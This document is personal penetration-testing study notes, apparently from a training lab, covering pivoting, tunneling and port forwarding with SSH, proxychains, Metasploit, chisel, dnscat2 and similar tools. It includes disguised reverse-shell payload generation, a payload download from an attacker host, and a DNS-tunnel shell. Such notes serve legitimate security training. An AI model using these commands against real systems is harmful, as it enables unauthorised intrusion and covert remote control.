#Pivoting #Pivot #Tunnel #Tunneling #PortForwarding #Pivot 

- **Pivoting** The idea of moving to other networks through a compromised host to find more targets on different network segments.
	- Some terms for the entry:
		- **Pivot Host**
		- **Proxy**
		- **Foothold**
		- **Beach Head system**
		- **Jump Host**
- **Tunneling** is encapsulating traffic, may be a subset of pivoting
	- **SSH Tunneling** using SSH to tunnel traffic (see SOCKS and Port Forwarding for more), typically this is victim back to attacker
		- **Reverse Tunneling** or **Reverse Proxy** sending traffic from attacker to victim
	- **SOCKS** socket secure - a TCP based communication channel, acts like a proxy
		- Sometimes can bypass firewall rules
		- May use NAT to route many hosts back to a single IP
		- **SOCKS4** doesn't not support auth nor UDP
		- **SOCKS5** supports auth and UDP
	- **SSH Tunneling of SOCKS PROXY** using a socks connection to tunnel SSH inside it
	- **Transparent Proxy** intercepting an applications traffic and sending it to the tunnel, this is for tools that are not able to set a proxy
	- **Bind Shell** when the target has a listening running for the attacker to connect to
- **Lateral Movement** is a technique used to further  access to additional `hosts`, `applications`, and `services` within a network environment.
- **Port Forwarding** is a technique that allows redirecting a communication request from one port to another.
	- `ssh -L 1234:localhost:3306 USER@TARGET` Using SSH as the tunnel and port 1234 as the communication port, tunnel port 3306 back to attacker from target over port 1234.  In other words.  Forward local port 1234 to the target's port 3306, using SSH as the tunnel. `-L` command of SSH tells it do do the port forward/tunnel.
		- `ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64` forwarding multiple ports
		- confirm port forwarding 
			- `nmap -v -sV -p1234 localhost`
			- `netstat -antp | grep 1234`
	- `ssh -D 9050 ubuntu@10.129.202.64` **Dynamic** port forwarding, forward everything at this port to the target, `-D` is what sets it as dynamic.  This is ran on the attackers machine.
- **Network Enumeration**
	- `ip a` or `ifconfig` on lined or `ipconfig` on windows to show network address and interfaces
	- `netstat -r` or `ip route` displays the routing table
- **ProxyChains**
	- Tool for dynamic tunneling or for apps that are not proxy aware
	- Forces applications to use a SOCKS proxy
	- May be very slow at times
	- Config file `/etc/proxychains.conf` to tell what proxy to use (maybe local SSH tunnel)
	- `proxychains nmap -v -sn 172.16.5.1-200` example of routing [[05 - Personal/Jonathan/Tools/NMAP|NMAP]] to a ssh tunnel
	- `proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123` use xfreerdp to **RDP** into target
	- curl --socks5 127.0.0.1:9050 http://support.inlanefreight.local   **check** if proxy is working
- **Remote or Reverse Port Forwarding**
	- Connecting an internal accessible only target back to an external attacker, which otherwise would never be able to initiate a connection back
	- Pivot host - the middle man between attacker and remote internal only target
	- `ssh -R <InternalIPofPivotHost>:9090:0.0.0.0:9050 ubuntu@<ipAddressofTarget> -vN`  use **SSH as Reverse Tunnel** ran on attacker system.  It tells the initial victim to setup a reverse tunnel back to the attacker.  So anything that sends data to the initial victims port 9090, the initial victim will forward that traffic to the attacker's port 9050.  `-R` tells initial victim to reverse proxy `-vN` is verbose/debug
- **Ping Sweeps** #ping
	- `run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23` **metasploit**
	- `for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done` **Linux Bash**
	- `for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"` **Windows CMD**
	- `1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}` **Windows PS**
- **Metasploit**  commands
	- `proxychains msfconsole` **forward** all metasploit traffic to the SOCKS5 proxy (must have proxy configured first)
	- `search rdp_scanner` or `use auxiliary/scanner/rdp/rdp_scanner` to do a **rdp query** of target(s)
	- `use exploit/multi/handler` the defacto metasploit handler to **catch incoming shells**
	- `use auxiliary/server/socks_proxy` metasploit will create a **socks proxy** on the attacking machine instead of **ssh tunneling**
		- **Configure** proxy in metasploit (**remember** to configure the socks4a config file)
		```bash
			msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
			SRVPORT => 9050
			msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
			SRVHOST => 0.0.0.0
			msf6 auxiliary(server/socks_proxy) > set version 4a
			version => 4a
			msf6 auxiliary(server/socks_proxy) > run
			[*] Auxiliary module running as background job 0.
		    jobs
		```
	- `use post/multi/manage/autoroute` this tells metasploit to send traffic of the specified subnet to the proxy
		- **Configure** metasploit to use the proxy (session 1) for all traffic destined to 172.16.5.0
			```bash
			msf6 > use post/multi/manage/autoroute
			msf6 post(multi/manage/autoroute) > set SESSION 1
			SESSION => 1
			msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
			SUBNET => 172.16.5.0
			msf6 post(multi/manage/autoroute) > run
			```
	- `run autoroute -s 172.16.5.0/23` **turn on** the autoroute job
	- `run autoroute -p` **list** all added subnets being routed to the proxy
		- `proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn` just like normal but instead of the ssh tunnel we are using metasploit
	- `portfwd add -l 3300 -p 3389 -r 172.16.5.19` set **port forwarding** in the metasploit proxy
	- `portfwd add -R -l 8081 -p 1234 -L 10.10.14.18` set **reverse port forwarding** in the metasploit proxy
	- **Configure** the multi handler for the reverse proxy connection
		```bash
		msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
		payload => windows/x64/meterpreter/reverse_tcp
		msf6 exploit(multi/handler) > set LPORT 8081 
		LPORT => 8081
		msf6 exploit(multi/handler) > set LHOST 0.0.0.0 
		LHOST => 0.0.0.0
		msf6 exploit(multi/handler) > run
		```
- **Msfvenom Payloads**
	- `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234` use **Metasploit** to send a reverse connection from the victim to the initial beach hold and then back to the attacker **windows**
		- `Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"` **windows PS** to DL the payload
	- `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080` use **Metasploit** to send a reverse connection from the victim to the initial beach hold and then back to the attacker **linux**
	- `msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443` use **Metasploit** to run a bind shell or bind listener on the victim to the attacker
- [[socat]] 
	- use **socat** as the reverse tunnel instead of **ssh**
	- `socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80` Socat will listen on localhost on **port 8080** and forward all the traffic to **port 80** on  attack host
	- `socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443` Socat will listen on localhost on **port 8080** and forward all the traffic to **port 8443** on  attack host
- **Plink**
	- windows version of a SOCKS proxy
	- `plink -ssh -D 9050 ubuntu@10.129.15.50` use **Plink** to ssh to a target, plink listens on pot 9050
- **Proxifier**
	- [www.proxifier.com](https://www.proxifier.com/)
	- another windows tool that can be a SOCKS proxy
- **Sshuttle**
	- Python tool proxy
	- [sshuttle](https://github.com/sshuttle/sshuttle)
	- `sudo apt-get install sshuttle`
	- `sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v` use **sshuttle** to create a reverse proxy `-r` connect to remote machine host then subnet to route
	- Creates entries/rules in **iptables** to redirect all traffic to the list subnet
- **Rpivot**
	- python socks4 proxy
	- [rpivot](https://github.com/klsecservices/rpivot)
	- `git clone https://github.com/klsecservices/rpivot.git`
	- `sudo apt-get install python2.7` if python 2 is not installed
	- `python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0` this will run the sock proxy on the attacker machine.  port 9050 is where proxychains fwds traffic to, port 9999 is where the pivot hosts forwards back to attack host
	- copy rpivot to pivot host
	- `python2.7 client.py --server-ip 10.10.14.18 --server-port 9999` run the client server on the pivot host back to the attack host over port 9999
	- example commands
		- `proxychains firefox-esr 172.16.5.135:80` browse to an internal target's webpage
- **Netsh** [[netsh]]
	- **run netsh** on the pivot host to listen for incoming traffic then forward it to the internal target
	- `netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25` **listen** on port 8080 on pivot host IP (10.129.15.150) then **fwd** to port 3389 on the internal target IP (172.16.5.25)
	- `netsh.exe interface portproxy show v4tov4` verify port forwarding **listen to** should be pivot host data and **connect to** is the internal target data
	- `xfreerdp /v:10.129.15.150:8080 /u:victor /p:pass@123` send RDP to pivot host which then FWDs to target host, RDP session should start/connect to internal target and NOT the pivot host
- **DNS Tunneling with Dnscat2**
	- [dnscat2](https://github.com/iagox86/dnscat2)
	- `git clone https://github.com/iagox86/dnscat2.git` grab repo
	- `sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache` run the server on attack host
	- `git clone https://github.com/lukebaggett/dnscat2-powershell.git` grab repo for client 
	- `Import-Module .\dnscat2.ps1` load powershell module
	- `Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd ` windows client to make connection back to attack host's server
	- `window -i 1` drop to CMD
- **Chisel SOCKS5**
	- [chisel](https://github.com/jpillora/chisel)
	- TCP/UDP-based tunneling uses HTTP encrypted by SSH
	- `git clone https://github.com/jpillora/chisel.git` grab repo
	- `go build` use golang to build binary (must have golang installed)
	- `scp chisel ubuntu@10.129.202.64:~/` copy chisel to target
	- `./chisel server -v -p 1234 --socks5` run socks5 proxy on **pivot host**
	- `./chisel client -v 10.129.202.64:1234 socks` connect to proxy from **attacker host**
	- **configure** proxychains to use chisel proxy
	- `proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123` using chisel proxy
	- `sudo ./chisel server --reverse -v -p 1234 --socks5` create a **reverse tunnel** on the **attacker host**
	- `./chisel client -v 10.10.14.17:1234 R:socks` connect to the **attacker host** from the **pivot host**
- **ICMP Tunneling**
	- Encapsulate traffic with ICMP packets
	- PING must be allowed on network
	- If external servers can be pinged, then it can be used for tunneling
	- [ptunnel-ng](https://github.com/utoni/ptunnel-ng)
		- new version of ptunnel
		- allows TCP connections encapsulated by ICMP echo packets
	- copy pttunnel to target
		- `scp -r ptunnel-ng ubuntu@10.129.202.64:~/` copy to a **linux** target
		- **windows** binaries
	- run ptunnel
		- Pivot host
			- `sudo ./ptunnel-ng -r10.129.202.64 -R22` **linux** `-r` pivot IP `-R` port on pivot host
			- **windows** binary
		- Attacker
			- `sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22` **linux** attacker `-p` address of **internal** target `-l` port **attacker** listens on`-r` address of the **pivot** host `-R` **pivot** host  port
			- **windows** binary
	- SSH **port forwarding**
		- `ssh -D 9050 -p2222 -lubuntu 127.0.0.1` SOCKS proxy **listening** on port `9050` **connect** to target on port `2222` **login** as user `ubuntu` local host is the **SOCKS Proxy**
	- Send commands to **internal** target
		- `proxychains nmap -sV -sT 172.16.5.19 -p3389` using proxy chains to do an nmap scan against internal target's port 3389
- **RDP and SOCKS Tunneling with SocksOverRDP**
	- uses Dynamic Virtual Channels (DVC) from the Remote Desktop Service feature of Windows
	- [SocksOverRDP](https://github.com/nccgroup/SocksOverRDP)
	- https://www.proxifier.com/download/#win-tab **windows** proxy server
	- `xfreerdp /v:172.16.5.19 /u:victor /p:pass@123` RDP to **pivot** host
	- copy over `SocksOverRDP-Plugin.dll`
	- `regsvr32.exe SocksOverRDP-Plugin.dll` **register** DLL
	- from **pivot** host RDP to **internal** host - there will be a message about plugin
	- copy `SocksOverRDP-Server.exe` to **internal** host and run as **admin**
	- `netstat -antb | findstr 1080` check if SocksOverRDP is running as it is static to 1080
	- **configure** proxy (proxifier) on **pivot** host to forward to `127.0.0.1:1080`
	- may need to adjust performance setting in RD Connection
	- In the module it was Kali RDP -> Attack Win VM RDP -> Pivot Win VM RDP -> Internal Win VM
- **ligolo-ng**
	- [[ligolo-ng]]